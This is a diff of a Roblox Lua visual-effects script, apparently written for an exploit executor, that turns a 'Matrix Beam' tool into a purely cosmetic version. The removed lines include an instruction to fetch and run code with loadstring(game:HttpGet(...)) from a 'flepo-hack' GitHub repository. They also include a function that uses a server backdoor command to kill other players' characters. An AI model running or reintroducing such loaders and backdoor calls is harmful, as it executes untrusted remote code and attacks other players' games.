@@ -1,5 +1,7 @@
--- 🔥 MATRIX ULTRA BEAM V6 PRANNETTU BY SUPERGROK – GGCMD BACKDOOR KILL!! 🔥
--- OFFICIAL BASE + ALL FIXES: No Glow, Glasses, Black Screens Both Sides, Double Click Tool, Trans Beam, Cracks+Smoke!!
+-- MATRIX ULTRA BEAM V8.1
+-- Delta/mobile friendly visual script:
+-- style swap (black clothes + sunglasses), matrix terminals, lean-back pose,
+-- right hand behind back while walking/idle, double tap beam summon.
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -7,351 +9,440 @@ local InsertService = game:GetService("InsertService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local Debris = game:GetService("Debris")
-local Lighting = game:GetService("Lighting")
 
 local player = Players.LocalPlayer
 if not player then return end
 
--- GGCMD CHECK + BACKDOOR
-if not getgenv().runCommand then
-    error("🚫 SUORITA EKA GGCMD: loadstring(game:HttpGet('https://raw.githubusercontent.com/flepo-hack/GGCMD/refs/heads/main/5j86'))()")
-end
-print("✅ GGCMD OK – BACKDOOR KILL READY!")
-
 local camera = workspace.CurrentCamera
 local mouse = player:GetMouse()
 
-local char, hum, root
+local character, humanoid, rootPart
+local tool, bodyColors
 local terminals = {}
 local updateConn, inputConn
-local bodyColors
-local leanTick = 0
-local lastClick = 0
-local tool -- Tool ref
 
-local matrixChars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ./\\|#$%&*+-=()[]{}<>?!"
+local leftShoulderDefault, rightShoulderDefault
+local rootJoint, rootJointDefault
+
+local DOUBLE_TAP_WINDOW = 0.35
+local lastTapTime = 0
+local lastTouchPos = Vector2.zero
+local tickWave = 0
+
+local MATRIX_CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ./\\|#$%&*+-=()[]{}<>?!"
+local ASSETS = {
+    Shirt = "rbxassetid://14238839317",
+    Pants = "rbxassetid://7150805858",
+    GlassesAsset = 6040339082,
+}
 
 local function pickChar()
-    local idx = math.random(1, #matrixChars)
-    return matrixChars:sub(idx, idx)
+    local i = math.random(1, #MATRIX_CHARS)
+    return MATRIX_CHARS:sub(i, i)
 end
 
 local function destroyTerminals()
-    for _, t in ipairs(terminals) do
-        if t.part then t.part:Destroy() end
+    for _, term in ipairs(terminals) do
+        if term.part then term.part:Destroy() end
     end
     table.clear(terminals)
+end
+
+local function resetPose()
+    if rootJoint and rootJointDefault then
+        rootJoint.C0 = rootJointDefault
+    end
+
+    local torso = character and (character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso"))
+    if not torso then return end
+
+    local leftShoulder = torso:FindFirstChild("Left Shoulder")
+    local rightShoulder = torso:FindFirstChild("Right Shoulder")
+
+    if leftShoulder and leftShoulderDefault then leftShoulder.C0 = leftShoulderDefault end
+    if rightShoulder and rightShoulderDefault then rightShoulder.C0 = rightShoulderDefault end
 end
 
 local function cleanup()
     if inputConn then inputConn:Disconnect(); inputConn = nil end
     if updateConn then updateConn:Disconnect(); updateConn = nil end
-    if bodyColors then bodyColors:Destroy(); bodyColors = nil end
+
+    resetPose()
+
+    if bodyColors then
+        bodyColors:Destroy()
+        bodyColors = nil
+    end
+
     destroyTerminals()
 end
 
-local function killAt(position, radius)
-    local seen = {}
-    for _, part in ipairs(workspace:GetPartBoundsInRadius(position, radius)) do
-        local model = part:FindFirstAncestorOfClass("Model")
-        if model and model \~= char and not seen[model] then
-            seen[model] = true
-            local targetHum = model:FindFirstChildOfClass("Humanoid")
-            if targetHum and targetHum.Health > 0 then
-                task.spawn(getgenv().runCommand, "kill", {model})
-            end
-        end
-    end
-end
-
-local function createCracks(pos)
-    local ray = workspace:Raycast(pos, Vector3.new(0, -50, 0))
+local function createGroundCracks(position)
+    local ray = workspace:Raycast(position + Vector3.new(0, 5, 0), Vector3.new(0, -40, 0))
     if not ray then return end
-    local hitPos = ray.Position + Vector3.new(0, 0.1, 0)
 
-    for i = 1, 8 do
+    local hit = ray.Position + Vector3.new(0, 0.05, 0)
+    for i = 1, 14 do
+        local angle = ((i - 1) / 14) * (math.pi * 2)
+
         local crack = Instance.new("Part")
-        crack.Name = "MatrixCrack"
+        crack.Name = "MatrixCrackV8"
         crack.Anchored = true
         crack.CanCollide = false
-        crack.Material = Enum.Material.Neon
-        crack.Color = Color3.new(0, 1, 0)
-        crack.Transparency = 0.3
-        crack.Size = Vector3.new(0.2, 0.2, 1)
-        crack.CFrame = CFrame.lookAt(hitPos, hitPos + Vector3.new(math.cos(i*math.pi/4), 0, math.sin(i*math.pi/4))) * CFrame.Angles(math.pi/2, 0, 0)
+        crack.Material = Enum.Material.Slate
+        crack.Color = Color3.fromRGB(24, 28, 24)
+        crack.Transparency = 0.25
+        crack.Size = Vector3.new(0.18, 0.04, 0.8)
+        crack.CFrame = CFrame.lookAt(hit, hit + Vector3.new(math.cos(angle), 0, math.sin(angle)))
+            * CFrame.Angles(math.rad(90), 0, 0)
         crack.Parent = workspace
 
-        TweenService:Create(crack, TweenInfo.new(0.4), {Size = Vector3.new(0.3, 0.3, 12), Transparency = 0.7}):Play()
-        TweenService:Create(crack, TweenInfo.new(1.2), {Transparency = 1}):Play()
-        Debris:AddItem(crack, 2)
+        TweenService:Create(crack, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {
+            Size = Vector3.new(0.26, 0.04, math.random(7, 16)),
+            Transparency = 0.5,
+        }):Play()
+
+        TweenService:Create(crack, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+            Transparency = 1,
+        }):Play()
+
+        Debris:AddItem(crack, 1.4)
     end
 end
 
-local function castBeam(targetPos)
-    local startPos = targetPos + Vector3.new(0, 250, 0)
+local function createImpact(position)
+    local ring = Instance.new("Part")
+    ring.Shape = Enum.PartType.Cylinder
+    ring.Anchored = true
+    ring.CanCollide = false
+    ring.Material = Enum.Material.Neon
+    ring.Color = Color3.fromRGB(25, 255, 100)
+    ring.Transparency = 0.12
+    ring.Size = Vector3.new(0.1, 2, 2)
+    ring.CFrame = CFrame.new(position) * CFrame.Angles(0, 0, math.rad(90))
+    ring.Parent = workspace
+
+    TweenService:Create(ring, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {
+        Size = Vector3.new(0.1, 30, 30),
+        Transparency = 1,
+    }):Play()
+
+    local smoke = Instance.new("ParticleEmitter")
+    smoke.Texture = "rbxassetid://296874371"
+    smoke.Color = ColorSequence.new(Color3.fromRGB(20, 230, 100), Color3.fromRGB(6, 70, 32))
+    smoke.Size = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 3),
+        NumberSequenceKeypoint.new(1, 8.5),
+    })
+    smoke.Lifetime = NumberRange.new(0.8, 1.6)
+    smoke.Speed = NumberRange.new(5, 14)
+    smoke.SpreadAngle = Vector2.new(180, 180)
+    smoke.Rate = 0
+    smoke.Parent = ring
+    smoke:Emit(130)
+
+    local sparks = Instance.new("ParticleEmitter")
+    sparks.Texture = "rbxassetid://241650934"
+    sparks.Color = ColorSequence.new(Color3.fromRGB(10, 255, 95))
+    sparks.Lifetime = NumberRange.new(0.2, 0.5)
+    sparks.Speed = NumberRange.new(28, 52)
+    sparks.SpreadAngle = Vector2.new(60, 60)
+    sparks.Rate = 0
+    sparks.Parent = ring
+    sparks:Emit(220)
+
+    createGroundCracks(position)
+    Debris:AddItem(ring, 1.2)
+end
+
+local function castBeam(targetPosition)
+    local sky = targetPosition + Vector3.new(0, 260, 0)
 
     local startPart = Instance.new("Part")
-    startPart.Name = "MatrixBeamStart"
     startPart.Anchored = true
     startPart.CanCollide = false
     startPart.Transparency = 1
-    startPart.Size = Vector3.new(3, 3, 3)
-    startPart.CFrame = CFrame.new(startPos)
+    startPart.Size = Vector3.new(2, 2, 2)
+    startPart.CFrame = CFrame.new(sky)
     startPart.Parent = workspace
 
     local endPart = Instance.new("Part")
-    endPart.Name = "MatrixBeamImpact"
     endPart.Anchored = true
     endPart.CanCollide = false
-    endPart.Shape = Enum.PartType.Ball
     endPart.Material = Enum.Material.Neon
-    endPart.Color = Color3.new(0, 1, 0)
-    endPart.Transparency = 1 -- Start invisible
-    endPart.Size = Vector3.new(8, 8, 8)
-    endPart.CFrame = CFrame.new(targetPos)
+    endPart.Shape = Enum.PartType.Ball
+    endPart.Color = Color3.fromRGB(15, 255, 90)
+    endPart.Transparency = 0
+    endPart.Size = Vector3.new(6, 6, 6)
+    endPart.CFrame = CFrame.new(targetPosition)
     endPart.Parent = workspace
 
-    local att0 = Instance.new("Attachment", startPart)
-    local att1 = Instance.new("Attachment", endPart)
+    local a0 = Instance.new("Attachment", startPart)
+    local a1 = Instance.new("Attachment", endPart)
 
     local beam = Instance.new("Beam")
-    beam.Attachment0 = att0
-    beam.Attachment1 = att1
-    beam.Color = ColorSequence.new(Color3.new(0, 1, 0))
+    beam.Attachment0 = a0
+    beam.Attachment1 = a1
+    beam.Color = ColorSequence.new(Color3.fromRGB(20, 255, 105))
     beam.Texture = "rbxassetid://499487295"
     beam.TextureLength = 1.5
-    beam.TextureSpeed = -20
-    beam.Width0 = 5
-    beam.Width1 = 10
+    beam.TextureSpeed = -28
+    beam.Width0 = 10
+    beam.Width1 = 15
     beam.LightEmission = 1
     beam.FaceCamera = true
     beam.Segments = 30
-    beam.CurveSize0 = -0.5
-    beam.CurveSize1 = 0.5
-    beam.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 0.4),
-        NumberSequenceKeypoint.new(1, 0.8)
-    })
+    beam.Transparency = NumberSequence.new(0)
     beam.Parent = workspace
 
-    -- Grow
-    TweenService:Create(beam, TweenInfo.new(0.5), {Width0=12, Width1=18}):Play()
-    TweenService:Create(endPart, TweenInfo.new(0.3), {Transparency=0.1, Size=Vector3.new(25,25,25)}):Play() -- Non-trans peak
-    TweenService:Create(endPart, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency=1}):Play()
+    TweenService:Create(endPart, TweenInfo.new(0.2), {
+        Size = Vector3.new(20, 20, 20),
+        Transparency = 0.3,
+    }):Play()
 
-    -- Sparks
-    local spark = Instance.new("ParticleEmitter", endPart)
-    spark.Texture = "rbxassetid://241650934"
-    spark.Color = ColorSequence.new(Color3.new(0,1,0))
-    spark.Size = NumberSequence.new{NumberSequenceKeypoint.new(0,0.5), NumberSequenceKeypoint.new(1,2)}
-    spark.Lifetime = NumberRange.new(0.4,0.8)
-    spark.Rate = 800
-    spark.SpreadAngle = Vector2.new(60,60)
-    spark.Speed = NumberRange.new(25,50)
-    spark:Emit(220)
+    TweenService:Create(endPart, TweenInfo.new(0.58, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Transparency = 1,
+    }):Play()
 
-    -- Fire
-    local fire = Instance.new("ParticleEmitter", endPart)
-    fire.Texture = "rbxassetid://292373707"
-    fire.Color = ColorSequence.new(Color3.new(0,1,1))
-    fire.Size = NumberSequence.new(1.5)
-    fire.Lifetime = NumberRange.new(0.6)
-    fire.Rate = 400
-    fire.Speed = NumberRange.new(10)
-    fire:Emit(150)
+    createImpact(targetPosition)
 
-    -- GREEN SMOKE SPREAD
-    local smoke = Instance.new("ParticleEmitter", endPart)
-    smoke.Texture = "rbxassetid://296874371" -- Smoke
-    smoke.Color = ColorSequence.new(Color3.new(0,1,0))
-    smoke.Size = NumberSequence.new{NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(1,4)}
-    smoke.Lifetime = NumberRange.new(0.8,1.5)
-    smoke.Rate = 300
-    smoke.SpreadAngle = Vector2.new(90,90)
-    smoke.Speed = NumberRange.new(5,15)
-    smoke:Emit(100)
+    Debris:AddItem(startPart, 1)
+    Debris:AddItem(endPart, 1)
+    Debris:AddItem(beam, 1)
+end
 
-    -- BACKDOOR KILLS + CRACKS + EXPL
+local function screenToWorld(screenPos)
+    local ray = camera:ViewportPointToRay(screenPos.X, screenPos.Y)
+    local hit = workspace:Raycast(ray.Origin, ray.Direction * 2200)
+    if hit then return hit.Position end
+    return ray.Origin + ray.Direction * 160
+end
+
+local function applyLook()
+    for _, child in ipairs(character:GetChildren()) do
+        if child:IsA("Shirt") or child:IsA("Pants") or child:IsA("BodyColors") then
+            child:Destroy()
+        end
+    end
+
+    local shirt = Instance.new("Shirt")
+    shirt.ShirtTemplate = ASSETS.Shirt
+    shirt.Parent = character
+
+    local pants = Instance.new("Pants")
+    pants.PantsTemplate = ASSETS.Pants
+    pants.Parent = character
+
+    bodyColors = Instance.new("BodyColors")
+    bodyColors.HeadColor3 = Color3.fromRGB(22, 22, 22)
+    bodyColors.TorsoColor3 = Color3.fromRGB(10, 10, 10)
+    bodyColors.LeftArmColor3 = Color3.fromRGB(22, 22, 22)
+    bodyColors.RightArmColor3 = Color3.fromRGB(22, 22, 22)
+    bodyColors.LeftLegColor3 = Color3.fromRGB(8, 8, 8)
+    bodyColors.RightLegColor3 = Color3.fromRGB(8, 8, 8)
+    bodyColors.Parent = character
+
     task.spawn(function()
-        task.wait(0.18)
-        killAt(targetPos, 16)
-        task.wait(0.12)
-        killAt(targetPos, 22)
-
-        createCracks(targetPos) -- MAA REPEILEE!!
-
-        local expl = Instance.new("Explosion")
-        expl.Position = targetPos
-        expl.BlastRadius = 60
-        expl.BlastPressure = 0
-        expl.Parent = workspace
-
-        -- Shake
-        local c0 = camera.CFrame
-        TweenService:Create(camera, TweenInfo.new(0.12), {CFrame = c0 * CFrame.new(math.random(-2,2), math.random(-2,2), 0)}):Play()
-        task.wait(0.12)
-        camera.CFrame = c0
+        local ok, asset = pcall(InsertService.LoadAsset, InsertService, ASSETS.GlassesAsset)
+        if ok and asset then
+            local glasses = asset:FindFirstChildOfClass("Accessory")
+            if glasses and character and character.Parent then
+                glasses.Parent = character
+            end
+            asset:Destroy()
+        end
     end)
+end
 
-    Debris:AddItem(startPart, 1.2)
-    Debris:AddItem(endPart, 1.2)
-    Debris:AddItem(beam, 1.2)
+local function setupPoseMotors()
+    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
+    if not torso then return end
+
+    local leftShoulder = torso:FindFirstChild("Left Shoulder")
+    local rightShoulder = torso:FindFirstChild("Right Shoulder")
+
+    if leftShoulder then leftShoulderDefault = leftShoulder.C0 end
+    if rightShoulder then rightShoulderDefault = rightShoulder.C0 end
+
+    rootJoint = torso:FindFirstChild("RootJoint") or torso:FindFirstChild("Waist")
+    if not rootJoint and rootPart then rootJoint = rootPart:FindFirstChild("RootJoint") end
+    if rootJoint then rootJointDefault = rootJoint.C0 end
 end
 
 local function buildTerminals()
     for i = 1, 3 do
         local part = Instance.new("Part")
-        part.Name = "MatrixTerm_" .. i
+        part.Name = "MatrixPanelV8_" .. i
         part.Anchored = true
         part.CanCollide = false
-        part.Size = Vector3.new(5, 7, 0.1)
-        part.Material = Enum.Material.Plastic -- No glow
-        part.Color = Color3.new(0, 0, 0) -- BLACK!!
-        part.Transparency = 0.4
+        part.Material = Enum.Material.Plastic
+        part.Color = Color3.new(0, 0, 0)
+        part.Transparency = 0.3
+        part.Size = Vector3.new(5.4, 7.2, 0.1)
         part.Parent = workspace
 
-        -- BOTH SIDES
+        local terminal = {
+            part = part,
+            offset = Vector3.new((i - 2) * 6.1, 2 + (math.sin(i) * 0.6), -12),
+            glyphs = {},
+        }
+
         for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back}) do
-            local sg = Instance.new("SurfaceGui")
-            sg.Face = face
-            sg.LightInfluence = 0
-            sg.AlwaysOnTop = true
-            sg.Parent = part
+            local gui = Instance.new("SurfaceGui")
+            gui.Face = face
+            gui.AlwaysOnTop = true
+            gui.LightInfluence = 0
+            gui.Parent = part
 
-            local bg = Instance.new("Frame", sg)
-            bg.Size = UDim2.fromScale(1,1)
-            bg.BackgroundColor3 = Color3.new(0,0,0)
-            bg.BackgroundTransparency = 0.3
+            local bg = Instance.new("Frame")
+            bg.Size = UDim2.fromScale(1, 1)
+            bg.BackgroundColor3 = Color3.new(0, 0, 0)
+            bg.BackgroundTransparency = 0.2
             bg.BorderSizePixel = 0
+            bg.Parent = gui
 
-            local sf = Instance.new("ScrollingFrame", bg)
-            sf.Size = UDim2.fromScale(1,1)
-            sf.BackgroundTransparency = 1
-            sf.ScrollBarThickness = 0
-            sf.CanvasSize = UDim2.new(0,0,0,1500)
-
-            local cols = 20
-            local tls = {}
+            local cols, rows = 18, 44
             for col = 1, cols do
-                for row = 1, 75 do
-                    local tl = Instance.new("TextLabel")
-                    tl.Size = UDim2.new(1/cols, 0, 0, 20)
-                    tl.Position = UDim2.new((col-1)/cols, 0, (row-1)/75, 0)
-                    tl.BackgroundTransparency = 1
-                    tl.Text = ""
-                    tl.TextColor3 = Color3.new(0, 1, 0) -- GREEN!!
-                    tl.TextSize = 18
-                    tl.Font = Enum.Font.Code
-                    tl.TextXAlignment = Enum.TextXAlignment.Center
-                    tl.Parent = sf
-                    table.insert(tls, {tl = tl, col = col, drop = math.random(0,1500), tail = 0})
+                for row = 1, rows do
+                    local label = Instance.new("TextLabel")
+                    label.Size = UDim2.new(1 / cols, 0, 1 / rows, 0)
+                    label.Position = UDim2.new((col - 1) / cols, 0, (row - 1) / rows, 0)
+                    label.BackgroundTransparency = 1
+                    label.Text = ""
+                    label.TextColor3 = Color3.fromRGB(0, 255, 90)
+                    label.TextSize = 16
+                    label.Font = Enum.Font.Code
+                    label.Parent = bg
+
+                    terminal.glyphs[#terminal.glyphs + 1] = {
+                        label = label,
+                        col = col,
+                        flow = math.random(0, 1000),
+                        glow = 0,
+                    }
                 end
             end
-
-            table.insert(terminals, {part = part, tls = tls, offset = Vector3.new((i-2)*5.5, math.sin(i*2)*1.5, -12)})
         end
+
+        terminals[#terminals + 1] = terminal
     end
 end
 
 local function setupEffects()
     cleanup()
+    applyLook()
+    setupPoseMotors()
+    buildTerminals()
+end
 
-    -- Clothes + Colors
-    for _, v in ipairs(char:GetChildren()) do
-        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then v:Destroy() end
+local function updateVisuals(dt)
+    if not (rootPart and humanoid and rootPart.Parent) then return end
+
+    tickWave += dt * 3
+    local moving = humanoid.MoveDirection.Magnitude > 0.05
+
+    local tilt = moving and -12 or -16
+    local wobble = math.sin(tickWave) * (moving and 1.4 or 0.8)
+
+    if rootJoint and rootJointDefault then
+        rootJoint.C0 = rootJointDefault * CFrame.Angles(math.rad(tilt + wobble), 0, 0)
     end
-    local shirt = Instance.new("Shirt", char); shirt.ShirtTemplate = "rbxassetid://14238839317"
-    local pants = Instance.new("Pants", char); pants.PantsTemplate = "rbxassetid://7150805858"
-    bodyColors = Instance.new("BodyColors", char)
-    bodyColors.HeadColor3 = Color3.fromRGB(10,25,10)
-    bodyColors.TorsoColor3 = Color3.new(0,0,0)
-    bodyColors.LeftArmColor3 = Color3.fromRGB(10,25,10)
-    bodyColors.RightArmColor3 = Color3.fromRGB(10,25,10)
-    bodyColors.LeftLegColor3 = Color3.new(0,0,0)
-    bodyColors.RightLegColor3 = Color3.new(0,0,0)
 
-    -- GLASSES FIX
-    task.spawn(function()
-        local ok, asset = pcall(InsertService.LoadAsset, InsertService, 6040339082)
-        if ok and asset then
-            local acc = asset:FindFirstChildOfClass("Accessory")
-            if acc and char.Parent then acc.Parent = char end
-            asset:Destroy()
+    local torso = character and (character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso"))
+    if torso then
+        local leftShoulder = torso:FindFirstChild("Left Shoulder")
+        local rightShoulder = torso:FindFirstChild("Right Shoulder")
+
+        if leftShoulder and leftShoulderDefault then
+            leftShoulder.C0 = leftShoulderDefault * CFrame.Angles(math.rad(-4), 0, math.rad(-2))
+        end
+
+        if rightShoulder and rightShoulderDefault then
+            local behindBack = rightShoulderDefault
+                * CFrame.new(0.1, 0.06, moving and 0.3 or 0.4)
+                * CFrame.Angles(math.rad(moving and 46 or 54), 0, math.rad(moving and 22 or 28))
+            rightShoulder.C0 = behindBack
+        end
+    end
+
+    local baseCF = rootPart.CFrame
+    local cameraPos = camera and camera.CFrame.Position or (baseCF.Position + baseCF.LookVector * 10)
+
+    for i, term in ipairs(terminals) do
+        local bob = math.sin((tickWave * 1.5) + i) * 0.27
+        local pos = (baseCF * CFrame.new(term.offset.X, term.offset.Y + bob, term.offset.Z)).Position
+        term.part.CFrame = CFrame.lookAt(pos, cameraPos)
+
+        for _, g in ipairs(term.glyphs) do
+            local stream = (os.clock() * 34 + g.col * 11) % 1000
+            g.flow = (g.flow + dt * 58) % 1000
+            local dist = math.abs(stream - g.flow)
+            g.glow = math.max(0, g.glow - dt * 4)
+
+            if dist < 42 then
+                g.glow = 1
+                g.label.Text = pickChar()
+                g.label.TextTransparency = 1 - (dist / 42)
+            else
+                g.label.Text = ""
+                g.label.TextTransparency = 1 - (g.glow * 0.35)
+            end
+        end
+    end
+end
+
+local function fireDoubleTap(screenPos)
+    local worldPos = UserInputService.TouchEnabled and screenToWorld(screenPos) or mouse.Hit.Position
+    castBeam(worldPos)
+end
+
+local function bindInput()
+    inputConn = UserInputService.InputBegan:Connect(function(input, processed)
+        if processed then return end
+
+        local t = input.UserInputType
+        if t ~= Enum.UserInputType.MouseButton1 and t ~= Enum.UserInputType.Touch then return end
+
+        local now = tick()
+        local isDouble = (now - lastTapTime) <= DOUBLE_TAP_WINDOW
+        lastTapTime = now
+
+        local pos = input.Position and Vector2.new(input.Position.X, input.Position.Y) or lastTouchPos
+        if t == Enum.UserInputType.Touch and input.Position then
+            lastTouchPos = Vector2.new(input.Position.X, input.Position.Y)
+        end
+
+        if isDouble then
+            fireDoubleTap(pos)
+            lastTapTime = 0
         end
     end)
-
-    -- ANIM
-    local anim = Instance.new("Animation")
-    anim.AnimationId = "rbxassetid://80575946555684"
-    local track = hum:LoadAnimation(anim)
-    track.Looped = true
-    track.Priority = Enum.AnimationPriority.Idle
-    track:Play()
-
-    buildTerminals()
 end
 
 local function createTool()
     tool = Instance.new("Tool")
-    tool.Name = "Matrix Beam" -- PICKUP OK!!
-    tool.RequiresHandle = false -- No hand affect
+    tool.Name = "Matrix Beam"
+    tool.RequiresHandle = false
     tool.CanBeDropped = true
     tool.Parent = player.Backpack
 
     tool.Equipped:Connect(function()
-        char = player.Character or player.CharacterAdded:Wait()
-        hum = char:WaitForChild("Humanoid")
-        root = char:WaitForChild("HumanoidRootPart")
+        character = player.Character or player.CharacterAdded:Wait()
+        humanoid = character:WaitForChild("Humanoid")
+        rootPart = character:WaitForChild("HumanoidRootPart")
+
         setupEffects()
+        bindInput()
 
-        -- DOUBLE CLICK FIRE
-        inputConn = UserInputService.InputBegan:Connect(function(input, gpe)
-            if gpe or input.UserInputType \~= Enum.UserInputType.MouseButton1 and input.UserInputType \~= Enum.UserInputType.Touch then return end
-            local now = tick()
-            if now - lastClick < 0.4 then
-                castBeam(mouse.Hit.Position)
-                lastClick = 0
-            else
-                lastClick = now
-            end
-        end)
-
-        -- UPDATE LOOP
-        updateConn = RunService.Heartbeat:Connect(function(dt)
-            if not (root and hum and root.Parent) then return end
-            leanTick += dt * 3
-            local moveMag = hum.MoveDirection.Magnitude
-            local tilt = moveMag > 0 and math.rad(-20 + math.sin(leanTick)*2) or math.rad(-15 + math.sin(leanTick))
-            root.CFrame = root.CFrame * CFrame.Angles(tilt * dt * 2, math.sin(leanTick*0.5)*0.002, 0)
-
-            local cf = root.CFrame
-            for i, term in ipairs(terminals) do
-                local posCf = cf * CFrame.new(term.offset)
-                term.part.CFrame = CFrame.lookAt(posCf.Position, cf.Position) * CFrame.Angles(0, math.rad(tick()*i*8), 0)
-                for _, data in ipairs(term.tls) do
-                    local speed = (tick()*40 + data.col*10) % 1500
-                    data.drop = (data.drop + dt*50) % 1500
-                    local dist = math.abs(speed - data.drop)
-                    data.tail = math.max(0, data.tail - dt*5)
-                    if dist < 50 then
-                        data.tail = 1
-                        data.tl.TextTransparency = 1 - (dist/50)
-                        data.tl.Text = pickChar()
-                    else
-                        data.tl.TextTransparency = 1 - data.tail*0.3
-                        data.tl.Text = ""
-                    end
-                end
-            end
-        end)
+        updateConn = RunService.Heartbeat:Connect(updateVisuals)
     end)
 
     tool.Unequipped:Connect(cleanup)
 end
 
-player.CharacterAdded:Connect(function(newChar)
-    if tool then tool.Parent = player.Backpack end -- Respawn tool
+player.CharacterAdded:Connect(function()
+    if tool then tool.Parent = player.Backpack end
 end)
 
 createTool()
-print("🚀 MATRIX ULTRA V6 READY! Equip Tool > Double Click!!")
+print("✅ MATRIX ULTRA V8.1 READY | Equip tool + double tap/click")
